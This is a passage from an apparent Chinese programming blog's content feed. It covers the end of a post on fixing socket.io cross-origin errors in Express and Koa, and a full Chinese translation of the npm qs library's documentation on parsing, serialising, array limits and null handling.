正常 如果正常链接 后端会打印有人链接</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>###问题</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a68783408dd6e02c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="socket跨域"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#39;http:&#x2F;&#x2F;localhost:3000&#x2F;socket.io&#x2F;?EIO&#x3D;4&amp;transport&#x3D;polling&amp;t&#x3D;NOibQzP&#39; from origin &#39;http:&#x2F;&#x2F;127.0.0.1:5501&#39;has been blocked by CORS policy: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource.</span><br></pre></td></tr></table></figure>
<p>会报这个错误 （跨域问题） 我们通常的解决方案是什么呢？</p>
<p>拿koa来说 你肯定会安装一个<code>koa-cors</code> 中间件来解决跨域 但是这只能解决你路由数据的跨域</p>
<p>并不能解决 <code>socket.io</code> 的跨域</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>我们需要在我们初始化 <code>socket.io</code> 的时候 加上一句<code>cors:true</code> 即可</p>
<p><code>express</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; socket 初始化const io &#x3D; require(&quot;socket.io&quot;)(server, &#123; cors: true &#125;)</span><br></pre></td></tr></table></figure>
<p><code>koa</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 初始化 socketconst io &#x3D; require(&quot;socket.io&quot;)(server, &#123; cors: true &#125;);</span><br></pre></td></tr></table></figure>

<p>我们在来看后台控制它是否打印了 “有人链接了” 的字样</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7611ff2c7418befa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="socket.io跨域"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>npm qs模块</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/npm-qs-%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>qs 是一个增加了一些安全性的查询字符串解析和序列化字符串的库。<br>主要维护者：Jordan Harband<br>最初创建者和维护者：TJ Holowaychuk</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var qs &#x3D; require(&#39;qs&#39;);</span><br><span class="line">var assert &#x3D; require(&#39;assert&#39;);</span><br><span class="line"></span><br><span class="line">var obj &#x3D; qs.parse(&#39;a&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(obj, &#123; a: &#39;c&#39; &#125;);</span><br><span class="line"></span><br><span class="line">var str &#x3D; qs.stringify(obj);</span><br><span class="line">assert.equal(str, &#39;a&#x3D;c&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><p>解析对象</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.parse(string, [options]);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>qs 允许在查询字符串中使用<code>[]</code>的方式创建嵌套的对象。例如，字符串<code>&#39;foo[bar]=baz&#39;</code>可以转换为：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.deepEqual(qs.parse(&#39;foo[bar]&#x3D;baz&#39;), &#123;</span><br><span class="line">    foo: &#123;</span><br><span class="line">        bar: &#39;baz&#39;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>When using the plainObjects option the parsed value is returned as a null object, created via Object.create(null) and as such you should be aware that prototype methods will not exist on it and a user may set those names to whatever value they like:</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var nullObject &#x3D; qs.parse(&#39;a[hasOwnProperty]&#x3D;b&#39;, &#123; plainObjects: true &#125;);</span><br><span class="line">assert.deepEqual(nullObject, &#123; a: &#123; hasOwnProperty: &#39;b&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var protoObject &#x3D; qs.parse(&#39;a[hasOwnProperty]&#x3D;b&#39;, &#123; allowPrototypes: true &#125;);</span><br><span class="line">assert.deepEqual(protoObject, &#123; a: &#123; hasOwnProperty: &#39;b&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>也可以解析 URI 编码：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.deepEqual(qs.parse(&#39;a%5Bb%5D&#x3D;c&#39;), &#123;</span><br><span class="line">    a: &#123; b: &#39;c&#39; &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>还可以像这样嵌套对象：<code>&#39;foo[bar][baz]=foobarbaz&#39;</code>：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.deepEqual(qs.parse(&#39;foo[bar][baz]&#x3D;foobarbaz&#39;), &#123;</span><br><span class="line">    foo: &#123;</span><br><span class="line">        bar: &#123;</span><br><span class="line">            baz: &#39;foobarbaz&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>当使用嵌套对象时，qs 在默认情况下最多解析到的深度是第五层（注：从第一个方括号到算起，到第五个方括号），例如尝试解析一个这样的字符串<code>&#39;a[b][c][d][e][f][g][h][i]=j&#39;</code>将会得到以下结果：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var expected &#x3D; &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: &#123;</span><br><span class="line">                d: &#123;</span><br><span class="line">                    e: &#123;</span><br><span class="line">                        f: &#123;</span><br><span class="line">                            &#39;[g][h][i]&#39;: &#39;j&#39;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var string &#x3D; &#39;a[b][c][d][e][f][g][h][i]&#x3D;j&#39;;</span><br><span class="line">assert.deepEqual(qs.parse(string), expected);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可以给 qs.parse 传递一个 <code>depth</code> 参数覆盖默认值：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var deep &#x3D; qs.parse(&#39;a[b][c][d][e][f][g][h][i]&#x3D;j&#39;, &#123; depth: 1 &#125;);</span><br><span class="line">assert.deepEqual(deep, &#123; a: &#123; b: &#123; &#39;[c][d][e][f][g][h][i]&#39;: &#39;j&#39; &#125; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>  当 qs 用于解析用户输入的时候，解析深度的限制有助于减轻用户的滥用行为。最好将 depth 设置为一个合理的尽量小的数字。</p>
</li>
<li><p>出于类似的原因，qs 在默认情况下最多解析 1000 个参数。通过传递 <code>parameterLimit</code> 参数可以修改默认值：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var limited &#x3D; qs.parse(&#39;a&#x3D;b&amp;c&#x3D;d&#39;, &#123; parameterLimit: 1 &#125;);</span><br><span class="line">assert.deepEqual(limited, &#123; a: &#39;b&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>忽略查询字符串开头的 <code>?</code> 可以使用 <code>ignoreQueryPrefix</code>：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var prefixed &#x3D; qs.parse(&#39;?a&#x3D;b&amp;c&#x3D;d&#39;, &#123; ignoreQueryPrefix: true &#125;);</span><br><span class="line">assert.deepEqual(prefixed, &#123; a: &#39;b&#39;, c: &#39;d&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>还可以根据自定义的分隔符来解析 <code>delimiter</code>：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var delimited &#x3D; qs.parse(&#39;a&#x3D;b;c&#x3D;d&#39;, &#123; delimiter: &#39;;&#39; &#125;);</span><br><span class="line">assert.deepEqual(delimited, &#123; a: &#39;b&#39;, c: &#39;d&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>分隔符可以是正则表达式：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var regexed &#x3D; qs.parse(&#39;a&#x3D;b;c&#x3D;d,e&#x3D;f&#39;, &#123; delimiter: &#x2F;[;,]&#x2F; &#125;);</span><br><span class="line">assert.deepEqual(regexed, &#123; a: &#39;b&#39;, c: &#39;d&#39;, e: &#39;f&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>allowDots</code> 选项可以启用点表示法：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withDots &#x3D; qs.parse(&#39;a.b&#x3D;c&#39;, &#123; allowDots: true &#125;);</span><br><span class="line">assert.deepEqual(withDots, &#123; a: &#123; b: &#39;c&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li> 解析数组</li>
</ol>
<ul>
<li><p>qs 也可以用<code>[]</code>解析数组：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withArray &#x3D; qs.parse(&#39;a[]&#x3D;b&amp;a[]&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(withArray, &#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可以指定数组索引：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withIndexes &#x3D; qs.parse(&#39;a[1]&#x3D;c&amp;a[0]&#x3D;b&#39;);</span><br><span class="line">assert.deepEqual(withIndexes, &#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>请注意，如果想要将字符串解析成数组而不是对象，那么<code>[]</code>之间的值必须是一个数字。 在创建具有特定索引的数组时，qs会将稀疏数组压缩为仅保留其顺序的现有值：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var noSparse &#x3D; qs.parse(&#39;a[1]&#x3D;b&amp;a[15]&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(noSparse, &#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>空字符串也是一个值，并将被保留：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withEmptyString &#x3D; qs.parse(&#39;a[]&#x3D;&amp;a[]&#x3D;b&#39;);</span><br><span class="line">assert.deepEqual(withEmptyString, &#123; a: [&#39;&#39;, &#39;b&#39;] &#125;);</span><br><span class="line"></span><br><span class="line">var withIndexedEmptyString &#x3D; qs.parse(&#39;a[0]&#x3D;b&amp;a[1]&#x3D;&amp;a[2]&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(withIndexedEmptyString, &#123; a: [&#39;b&#39;, &#39;&#39;, &#39;c&#39;] &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>qs 还会限制数组最大索引为 20，任何索引大于20的数组成员都将被转换为以索引为键的对象：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withMaxIndex &#x3D; qs.parse(&#39;a[100]&#x3D;b&#39;);</span><br><span class="line">assert.deepEqual(withMaxIndex, &#123; a: &#123; &#39;100&#39;: &#39;b&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>arrayLimit</code> 选项可以修改默认限制：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withArrayLimit &#x3D; qs.parse(&#39;a[1]&#x3D;b&#39;, &#123; arrayLimit: 0 &#125;);</span><br><span class="line">assert.deepEqual(withArrayLimit, &#123; a: &#123; &#39;1&#39;: &#39;b&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>字符串不解析成数组，可以设置 <code>parseArrays</code> 为 <code>false</code></p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var noParsingArrays &#x3D; qs.parse(&#39;a[]&#x3D;b&#39;, &#123; parseArrays: false &#125;);</span><br><span class="line">assert.deepEqual(noParsingArrays, &#123; a: &#123; &#39;0&#39;: &#39;b&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>如果混合使用两种格式，qs 会将字符串解析为对象：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mixedNotation &#x3D; qs.parse(&#39;a[0]&#x3D;b&amp;a[b]&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(mixedNotation, &#123; a: &#123; &#39;0&#39;: &#39;b&#39;, b: &#39;c&#39; &#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>也可以创建元素为对象的数组：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arraysOfObjects &#x3D; qs.parse(&#39;a[][b]&#x3D;c&#39;);</span><br><span class="line">assert.deepEqual(arraysOfObjects, &#123; a: [&#123; b: &#39;c&#39; &#125;] &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><p>序列化字符串</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(object, [options]);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>默认情况下，对象序列化后进行URI编码后输出：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b&#39; &#125;), &#39;a&#x3D;b&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#123; b: &#39;c&#39; &#125; &#125;), &#39;a%5Bb%5D&#x3D;c&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>通过设置 <code>encode</code> 为 <code>false</code> 禁止 URI 编码：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var unencoded &#x3D; qs.stringify(&#123; a: &#123; b: &#39;c&#39; &#125; &#125;, &#123; encode: false &#125;);</span><br><span class="line">assert.equal(unencoded, &#39;a[b]&#x3D;c&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>通过设置 <code>encodeValuesOnly</code> 为 <code>true</code>，可以禁用对 key 进行URI 编码：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var encodedValues &#x3D; qs.stringify(</span><br><span class="line">    &#123; a: &#39;b&#39;, c: [&#39;d&#39;, &#39;e&#x3D;f&#39;], f: [[&#39;g&#39;], [&#39;h&#39;]] &#125;,</span><br><span class="line">    &#123; encodeValuesOnly: true &#125;</span><br><span class="line">);</span><br><span class="line">assert.equal(encodedValues,&#39;a&#x3D;b&amp;c[0]&#x3D;d&amp;c[1]&#x3D;e%3Df&amp;f[0][0]&#x3D;g&amp;f[1][0]&#x3D;h&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>可以通过设置<code>encoder</code> 选项自定义编码方式（<em>注意：当 <code>encode</code> 被设置为 <code>false</code> 的时候，不适用</em>）：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var encoded &#x3D; qs.stringify(&#123; a: &#123; b: &#39;c&#39; &#125; &#125;, &#123; encoder: function (str) &#123;</span><br><span class="line">    &#x2F;&#x2F; Passed in values &#96;a&#96;, &#96;b&#96;, &#96;c&#96;</span><br><span class="line">    return &#x2F;&#x2F; Return encoded string</span><br><span class="line">&#125;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>与<code>encoder</code> 类似 <code>decoder</code> 可以用来解码：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	var decoded &#x3D; qs.parse(&#39;x&#x3D;z&#39;, &#123; decoder: function (str) &#123;</span><br><span class="line">	    &#x2F;&#x2F; Passed in values &#96;x&#96;, &#96;z&#96;</span><br><span class="line">	    return &#x2F;&#x2F; Return decoded string</span><br><span class="line">	&#125;&#125;)</span><br><span class="line"></span><br><span class="line">Examples beyond this point will be shown as though the output is not URI encoded for clarity. Please note that the return values in these cases will be URI encoded during real usage.</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>当数组被序列化时，默认显示索引：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;, &#39;d&#39;] &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a[0]&#x3D;b&amp;a[1]&#x3D;c&amp;a[2]&#x3D;d&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可以通过设置 <code>indices</code> 为 <code>false</code> 不显示索引：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;, &#39;d&#39;] &#125;, &#123; indices: false &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a&#x3D;b&amp;a&#x3D;c&amp;a&#x3D;d&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可以通过设置 <code>arrayFormat</code> 选项指定数组输出格式：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;, &#123; arrayFormat: &#39;indices&#39; &#125;)</span><br><span class="line">&#x2F;&#x2F; &#39;a[0]&#x3D;b&amp;a[1]&#x3D;c&#39;</span><br><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;, &#123; arrayFormat: &#39;brackets&#39; &#125;)</span><br><span class="line">&#x2F;&#x2F; &#39;a[]&#x3D;b&amp;a[]&#x3D;c&#39;</span><br><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;] &#125;, &#123; arrayFormat: &#39;repeat&#39; &#125;)</span><br><span class="line">&#x2F;&#x2F; &#39;a&#x3D;b&amp;a&#x3D;c&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>对象序列化时，默认使用 <code>[]</code> 表示法：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(&#123; a: &#123; b: &#123; c: &#39;d&#39;, e: &#39;f&#39; &#125; &#125; &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a[b][c]&#x3D;d&amp;a[b][e]&#x3D;f&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>通过设置 <code>allowDots</code> 为 <code>true</code>修改为点表示法：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qs.stringify(&#123; a: &#123; b: &#123; c: &#39;d&#39;, e: &#39;f&#39; &#125; &#125; &#125;, &#123; allowDots: true &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a.b.c&#x3D;d&amp;a.b.e&#x3D;f&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>空字符串和<code>null</code>值将被省略，但是<code>=</code>会保留：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: &#39;&#39; &#125;), &#39;a&#x3D;&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>没有值的键将什么也不返回（例如空对象或数组）：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: [] &#125;), &#39;&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#123;&#125; &#125;), &#39;&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: [&#123;&#125;] &#125;), &#39;&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#123; b: []&#125; &#125;), &#39;&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#123; b: &#123;&#125;&#125; &#125;), &#39;&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>值为 <code>undefined</code> 的属性将会被完全忽略：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: null, b: undefined &#125;), &#39;a&#x3D;&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>addQueryPrefix</code> 设置为 <code>true</code>可以在查询字符串前面加 <code>?</code>：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b&#39;, c: &#39;d&#39; &#125;, &#123; addQueryPrefix: true &#125;), &#39;?a&#x3D;b&amp;c&#x3D;d&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>分隔符也可以设置：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b&#39;, c: &#39;d&#39; &#125;, &#123; delimiter: &#39;;&#39; &#125;), &#39;a&#x3D;b;c&#x3D;d&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>如果只是序列化日期对象，可以使用 <code>serializeDate</code> 选项：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var date &#x3D; new Date(7);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: date &#125;), &#39;a&#x3D;1970-01-01T00:00:00.007Z&#39;.replace(&#x2F;:&#x2F;g, &#39;%3A&#39;));</span><br><span class="line">assert.equal(</span><br><span class="line">    qs.stringify(&#123; a: date &#125;, &#123; serializeDate: function (d) &#123; return d.getTime(); &#125; &#125;),</span><br><span class="line">    &#39;a&#x3D;7&#39;</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>可以使用 <code>sort</code> 选项来修改键的顺序：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function alphabeticalSort(a, b) &#123;</span><br><span class="line">    return a.localeCompare(b);</span><br><span class="line">&#125;</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#39;c&#39;, z: &#39;y&#39;, b : &#39;f&#39; &#125;, &#123; sort: alphabeticalSort &#125;), &#39;a&#x3D;c&amp;b&#x3D;f&amp;z&#x3D;y&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>最后，可以使用 <code>filter</code> 选项过滤序列化输出的键。如果给<code>filter</code>传递一个函数，每个键调用一次该函数并用返回的值替换原来值。如果给<code>filter</code>传递一个数组，它将用于选择对象的key和数组的索引：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function filterFunc(prefix, value) &#123;</span><br><span class="line">    if (prefix &#x3D;&#x3D; &#39;b&#39;) &#123;</span><br><span class="line">        &#x2F;&#x2F; Return an &#96;undefined&#96; value to omit a property.</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    if (prefix &#x3D;&#x3D; &#39;e[f]&#39;) &#123;</span><br><span class="line">        return value.getTime();</span><br><span class="line">    &#125;</span><br><span class="line">    if (prefix &#x3D;&#x3D; &#39;e[g][0]&#39;) &#123;</span><br><span class="line">        return value * 2;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line">qs.stringify(&#123; a: &#39;b&#39;, c: &#39;d&#39;, e: &#123; f: new Date(123), g: [2] &#125; &#125;, &#123; filter: filterFunc &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a&#x3D;b&amp;c&#x3D;d&amp;e[f]&#x3D;123&amp;e[g][0]&#x3D;4&#39;</span><br><span class="line">qs.stringify(&#123; a: &#39;b&#39;, c: &#39;d&#39;, e: &#39;f&#39; &#125;, &#123; filter: [&#39;a&#39;, &#39;e&#39;] &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a&#x3D;b&amp;e&#x3D;f&#39;</span><br><span class="line">qs.stringify(&#123; a: [&#39;b&#39;, &#39;c&#39;, &#39;d&#39;], e: &#39;f&#39; &#125;, &#123; filter: [&#39;a&#39;, 0, 2] &#125;);</span><br><span class="line">&#x2F;&#x2F; &#39;a[0]&#x3D;b&amp;a[2]&#x3D;d&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li> 处理 <code>null</code> 值</li>
</ol>
<ul>
<li><p>默认情况下，<code>null</code> 值被视为空对象：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var withNull &#x3D; qs.stringify(&#123; a: null, b: &#39;&#39; &#125;);</span><br><span class="line">assert.equal(withNull, &#39;a&#x3D;&amp;b&#x3D;&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>解析字符串的时候并不会区分参数有没有等号，没有值的话都会解析为空字符串：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var equalsInsensitive &#x3D; qs.parse(&#39;a&amp;b&#x3D;&#39;);</span><br><span class="line">assert.deepEqual(equalsInsensitive, &#123; a: &#39;&#39;, b: &#39;&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>要想区分空字符串和<code>null</code>值可以使用 <code>strictNullHandling</code> 选项，序列化后的 <code>null</code> 值没有<code>=</code></p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var strictNull &#x3D; qs.stringify(&#123; a: null, b: &#39;&#39; &#125;, &#123; strictNullHandling: true &#125;);</span><br><span class="line">assert.equal(strictNull, &#39;a&amp;b&#x3D;&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>要解析不带 <code>=</code> 的值返回 <code>null</code>可以使用 <code>strictNullHandling</code> 选项：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var parsedStrictNull &#x3D; qs.parse(&#39;a&amp;b&#x3D;&#39;, &#123; strictNullHandling: true &#125;);</span><br><span class="line">assert.deepEqual(parsedStrictNull, &#123; a: null, b: &#39;&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>想要完全跳过值为 <code>null</code> 的键不解析，可以使用 <code>skipNulls</code> 选项：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var nullsSkipped &#x3D; qs.stringify(&#123; a: &#39;b&#39;, c: null&#125;, &#123; skipNulls: true &#125;);</span><br><span class="line">assert.equal(nullsSkipped, &#39;a&#x3D;b&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li> 处理特殊字符集：</li>
</ol>
<ul>
<li><p>默认情况下，字符的编码和解码在utf-8中完成。 如果希望将查询字符串编码为不同的字符集（i.e.Shift JIS），您可以使用qs-iconv库：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var encoder &#x3D; require(&#39;qs-iconv&#x2F;encoder&#39;)(&#39;shift_jis&#39;);</span><br><span class="line">var shiftJISEncoded &#x3D; qs.stringify(&#123; a: &#39;こんにちは！&#39; &#125;, &#123; encoder: encoder &#125;);</span><br><span class="line">assert.equal(shiftJISEncoded, &#39;a&#x3D;%82%B1%82%F1%82%C9%82%BF%82%CD%81I&#39;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>这也适用于解码查询字符串：</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var decoder &#x3D; require(&#39;qs-iconv&#x2F;decoder&#39;)(&#39;shift_jis&#39;);</span><br><span class="line">var obj &#x3D; qs.parse(&#39;a&#x3D;%82%B1%82%F1%82%C9%82%BF%82%CD%81I&#39;, &#123; decoder: decoder &#125;);</span><br><span class="line">assert.deepEqual(obj, &#123; a: &#39;こんにちは！&#39; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li><p>RFC 3986 and RFC 1738 space encoding</p>
<p> RFC3986 used as default option and encodes ’ ’ to %20 which is backward compatible. In the same time, output can be stringified as per RFC1738 with ’ ’ equal to ‘+’.</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b c&#39; &#125;), &#39;a&#x3D;b%20c&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b c&#39; &#125;, &#123; format : &#39;RFC3986&#39; &#125;), &#39;a&#x3D;b%20c&#39;);</span><br><span class="line">assert.equal(qs.stringify(&#123; a: &#39;b c&#39; &#125;, &#123; format : &#39;RFC1738&#39; &#125;), &#39;a&#x3D;b+c&#39;);</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>npm命令记录</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/npm%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
